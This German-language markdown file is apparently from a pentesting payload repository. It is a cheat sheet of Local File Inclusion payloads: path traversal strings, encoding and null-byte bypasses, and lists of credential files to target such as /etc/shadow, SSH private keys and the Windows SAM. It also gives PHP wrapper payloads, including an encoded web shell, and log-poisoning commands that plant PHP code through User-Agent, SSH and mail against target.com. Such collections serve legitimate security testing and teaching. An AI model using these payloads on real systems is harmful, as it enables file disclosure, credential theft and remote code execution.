# 📂 Sammlung von LFI-Payloads

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](LFI.tr.md) • [🇬🇷 Ελληνικά](LFI.el.md)

```
  ██╗     ███████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██║     ██╔════╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ██║     █████╗  ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ██║     ██╔══╝  ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████╗██║     ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚═╝     ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

## 🐧 Linux-Dateien

### Einfache Pfadmanipulation
```
/etc/passwd
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

### URL-kodiert
```
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Umgehungstechniken
```
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd
..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8fetc/passwd
/etc/passwd%00
/etc/passwd%00.jpg
/etc/passwd%00.php
```

### Interessante Linux-Dateien
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/group
/etc/resolv.conf
/etc/crontab
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/var/log/syslog
/home/user/.ssh/id_rsa
/home/user/.bash_history
/root/.bash_history
/root/.ssh/id_rsa
```

---

## 🪟 Windows-Dateien

### Einfache Pfadmanipulation
```
C:\Windows\System32\drivers\etc\hosts
C:/Windows/System32/drivers/etc/hosts
..\..\..\..\Windows\System32\drivers\etc\hosts
....\\....\\....\\Windows\\System32\\drivers\\etc\\hosts
```

### Interessante Windows-Dateien
```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
C:\Windows\win.ini
C:\Windows\system.ini
C:\boot.ini
C:\inetpub\logs\LogFiles
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\php\php.ini
C:\Program Files\FileZilla Server\FileZilla Server.xml
```

---

## 🔄 Wrapper in PHP

### php://filter (Quelltext lesen)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
```

### php://input (Codeausführung)
```
php://input
POST: <?php system('id'); ?>
```

### data://-Wrapper
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
data://text/plain,<?php system($_GET['cmd']); ?>
```

### expect:// (RCE)
```
expect://id
expect://whoami
```

### zip://-Wrapper
```
zip://path/to/file.zip%23shell.php
```

### phar://-Wrapper
```
phar://uploads/shell.jpg/test.php
```

---

## 🔥 Log Poisoning (Codeausführung)

### Apache-Zugriffsprotokoll
```bash
# 1. PHP über User-Agent einschleusen
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 2. Protokolldatei einbinden
?page=/var/log/apache2/access.log&cmd=id
```

### SSH-Protokoll
```bash
# 1. Über SSH einschleusen
ssh '<?php system($_GET["cmd"]);?>'@target.com

# 2. Protokoll einbinden
?page=/var/log/auth.log&cmd=id
```

### Mail-Protokoll
```bash
# 1. E-Mail mit präpariertem Inhalt senden
mail -s "<?php system(\$_GET['cmd']); ?>" target@localhost

# 2. Protokoll einbinden
?page=/var/log/mail.log&cmd=id
```

### Prozessumgebung über proc
```
?page=/proc/self/environ
# User-Agent: <?php system('id'); ?>
```

---

## 📊 Kurzreferenz

### Erkennung
```
?page=../../../etc/passwd
?file=....//....//etc/passwd
?path=/etc/passwd%00
```

### Filterumgehung
| Filter | Umgehung |
|--------|--------|
| `../` blockiert | `....//`, `..././` |
| `.php` erforderlich | `%00`, Nullbyte |
| Positivliste | php://-Wrapper |

### Häufige Parameter
```
page, file, path, include, doc
document, folder, root, pg, style
template, view, content, load
```

---

## 📚 Ressourcen

- [PayloadsAllTheThings LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

---

<p align="center">
  <b>📂 LFI-Payload-Sammlung</b><br>
  <i>Nur zu Lernzwecken!</i>
</p>

---

---

## Hinweise zur deutschen Ausgabe

> **Historische Beispiele:** Nullbyte- und Mehrfachdekodierungsvarianten hängen von Laufzeit, Webserver und Filterung ab; sie sind keine universellen Umgehungen heutiger PHP-Versionen. Die Tabelle ist eine verkürzte Sammlung von Testwerten, keine verlässliche Zuordnung „Filter vorhanden → Payload funktioniert“. [PHP: Nullbyte-Hintergrund](https://www.php.net/manual/en/security.filesystem.nullbytes.php).

> **Wrapper und Auswirkungen:** `expect://` setzt die entsprechende Erweiterung voraus. Andere Wrapper und Einbindungsmethoden hängen von Konfiguration und API ab. Lesen und Ausführen sind unterschiedliche Vorgänge: ein lesbarer Dateipfad allein beweist keine Codeausführung. Log-Poisoning benötigt kontrollierbare protokollierte Inhalte, einen passenden Einbindungspfad und eine ausführende Verarbeitung. Dateien und Protokollpfade sind umgebungsabhängig; Phar-Verhalten ist versionsabhängig. Originalpfade und Payloads bleiben erhalten.
